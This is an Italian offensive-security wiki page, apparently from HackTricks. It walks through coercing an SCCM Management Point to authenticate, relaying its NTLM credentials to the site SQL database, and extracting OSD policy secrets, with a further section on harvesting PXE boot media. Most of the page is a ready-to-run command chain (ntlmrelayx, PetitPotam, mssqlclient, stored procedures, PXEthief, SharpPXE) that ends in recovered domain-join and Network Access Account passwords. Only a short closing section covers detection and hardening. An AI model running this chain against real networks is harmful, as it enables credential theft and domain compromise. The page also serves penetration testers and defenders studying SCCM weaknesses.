# SCCM Management Point NTLM Relay to SQL – Estrazione dei segreti delle policy OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Forzando un **System Center Configuration Manager (SCCM) Management Point (MP)** ad autenticarsi tramite SMB/RPC e **relaying** quell'account macchina NTLM al **site database (MSSQL)** si ottengono i diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli consentono di chiamare un insieme di stored procedure che espongono i blob delle policy di **Operating System Deployment (OSD)** (credenziali del Network Access Account, variabili della Task Sequence, ecc.). I blob sono codificati in esadecimale e crittografati, ma possono essere decodificati e decrittografati con **PXEthief**, ottenendo i segreti in chiaro.

Catena di alto livello:
1. Individuare MP e site DB ↦ endpoint HTTP non autenticato `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Avviare `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forzare l'autenticazione dell'MP usando **PetitPotam**, PrinterBug, DFSCoerce, ecc.
4. Tramite il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come account **<DOMAIN>\\<MP-host>$** sottoposto a relay.
5. Eseguire:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (oppure `MP_GetPolicyBodyAfterAuthorization`)
6. Rimuovere il BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Segreti come `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ecc. vengono recuperati senza interagire con PXE o con i client.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerazione degli endpoint MP non autenticati
L'estensione ISAPI **GetAuth.dll** dell'MP espone diversi parametri che non richiedono autenticazione (a meno che il sito non sia solo PKI):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + i GUID dei dispositivi *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Elenca ogni Management-Point nel sito. |
| `SITESIGNCERT` | Restituisce il certificato di firma del Primary-Site (identifica il site server senza LDAP). |

Recuperare i GUID che fungeranno da **clientID** per le successive query al DB:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Esegui il relay dell'account macchina dell'MP verso MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando si attiva la coercizione, dovresti vedere qualcosa del genere:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificare le policy OSD tramite stored procedures
Connettiti tramite il SOCKS proxy (porta 1080 per impostazione predefinita):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Passa al DB **CM_<SiteCode>** (usa il codice sito di 3 cifre, ad esempio `CM_001`).

### 3.1  Trova i GUID degli Unknown-Computer (facoltativo)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Elencare le policy assegnate
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Ogni riga contiene `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Concentrati sulle policy:
* **NAAConfig**  – credenziali del Network Access Account
* **TS_Sequence** – variabili della Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – può contenere account run-as

### 3.3  Recupera il body completo
Se disponi già di `PolicyID` e `PolicyVersion`, puoi ignorare il requisito del clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: In SSMS aumenta “Maximum Characters Retrieved” (>65535), altrimenti il blob verrà troncato.

---

## 4. Decodifica e decrittografa il blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Esempio di secrets recuperati:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Ruoli e procedure SQL rilevanti
Dopo il relay, il login viene mappato a:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Questi ruoli espongono dozzine di permessi EXEC; quelli principali usati in questo attacco sono:

| Stored Procedure | Scopo |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Elenca le policy applicate a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Restituisce il corpo completo della policy. |
| `MP_GetListOfMPsInSiteOSD` | Restituita dal percorso `MPKEYINFORMATIONMEDIA`. |

Puoi esaminare l’elenco completo con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Raccolta dei supporti di avvio PXE (SharpPXE)
* **Risposta PXE su UDP/4011**: inviare una richiesta di avvio PXE a un Distribution Point configurato per PXE. La risposta proxyDHCP rivela percorsi di avvio come `SMSBoot\\x64\\pxe\\variables.dat` (configurazione crittografata) e `SMSBoot\\x64\\pxe\\boot.bcd`, oltre a un blob di chiavi crittografato opzionale.<sup>[[4]](#references)</sup>
* **Recuperare gli artefatti di avvio tramite TFTP**: usare i percorsi restituiti per scaricare `variables.dat` tramite TFTP (senza autenticazione). Il file è piccolo (pochi KB) e contiene le variabili del supporto crittografate.
* **Decrittografare o crackare**:
- Se la risposta include la chiave di decrittografia, fornirla a **SharpPXE** per decrittografare direttamente `variables.dat`.
- Se non viene fornita alcuna chiave (supporto PXE protetto da una password personalizzata), SharpPXE genera un hash **compatibile con Hashcat** nel formato `$sccm$aes128$...` per il cracking offline. Dopo aver recuperato la password, decrittografare il file.
* **Analizzare l'XML decrittografato**: le variabili in chiaro contengono metadati di deployment SCCM (**URL del Management Point**, **Site Code**, GUID dei supporti e altri identificatori). SharpPXE li analizza e stampa un comando **SharpSCCM** pronto all'uso, con i parametri GUID/PFX/site precompilati per il follow-on abuse.
* **Requisiti**: sono necessari solo la raggiungibilità di rete del listener PXE (UDP/4011) e TFTP; non sono richiesti privilegi di amministratore locale.

---

## 7. Rilevamento e hardening
1. **Monitorare i login al MP** – qualsiasi account computer MP che effettua il login da un IP diverso da quello del proprio host è un'indicazione di relay.<sup>[[1]](#references)</sup>
2. Abilitare **Extended Protection for Authentication (EPA)** sul database del sito (`PREVENT-14`).
3. Disabilitare NTLM non utilizzato, imporre la firma SMB e limitare RPC (
le stesse mitigazioni utilizzate contro `PetitPotam`/`PrinterBug`).
4. Rafforzare la comunicazione MP ↔ DB con IPSec / mutual-TLS.
5. **Limitare l'esposizione PXE** – applicare regole firewall per UDP/4011 e TFTP alle VLAN affidabili, richiedere password PXE e generare alert per i download TFTP di `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Vedi anche
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Riferimenti
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
